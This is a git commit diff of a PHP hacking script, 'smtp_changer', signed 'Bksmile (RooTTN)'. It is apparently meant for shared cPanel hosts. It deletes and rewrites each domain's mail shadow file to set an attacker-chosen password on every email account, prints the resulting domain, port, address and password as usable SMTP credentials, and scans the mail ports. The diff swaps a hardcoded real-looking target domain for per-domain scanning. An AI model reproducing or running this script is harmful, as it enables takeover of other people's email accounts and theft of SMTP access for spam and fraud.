dc39b1586afa126b8a58657301f195f44762ed2d
bksmile <bouboukb@yahoo.com>
2017-12-19 11:36:15 +0100

    v1

--- smtp_changer/wbf.php
+++ smtp_changer/wbf.php
@@ -1,10 +1,11 @@
 <?php
 //Bksmile *(RooTTN)*
 set_time_limit(0);
-ini_set('max_execution_time', 0);
-ini_set('memory_limit', -1);
-$ports = array(25, 587, 465, 110, 995, 143 , 993);
-$host = "rentatuauto.com.mx";
+ini_set('max_execution_time',0);
+ini_set('memory_limit',-1);
+// port to scan
+$ports=array(25, 587, 465, 110, 995, 143 , 993);
+$primary_port='25';
 //curent user
 $user=get_current_user();
 // Smtp password
@@ -23,6 +24,7 @@ $ex=explode("\r\n",$passwd);
 @link('/home/'.$user.'/etc/'.$t.'/shadow','/home/'.$user.'/etc/'.$t.'/shadow.roottn.bak');
 //delete shadow
 @unlink('/home/'.$user.'/etc/'.$t.'/shadow');
+// :D
 foreach($ex as $ex){
 $ex=explode(':',$ex);
 $e= $ex[0];
@@ -30,9 +32,10 @@ if ($e){
 $b=fopen('/home/'.$user.'/etc/'.$t.'/shadow','ab');fwrite($b,$e.':'.$pwd.':16249:::::'."\r\n");fclose($b);
 echo '<span style=\'color:#00ff00;\'>'.$t.'|25|'.$e.'@'.$t.'|'.$password.'</span><br>';  "</center>";
 }}
+//port scan
 foreach ($ports as $port)
 {
-    $connection = @fsockopen($host, $port, $errno, $errstr, 2);
+    $connection = @fsockopen($t, $port, $errno, $errstr, 2);
     if (is_resource($connection))
     {
         echo '<h2>' . $host . ':' . $port . ' ' . '(' . getservbyport($port, 'tcp') . ') is open.</h2>' . "\n";
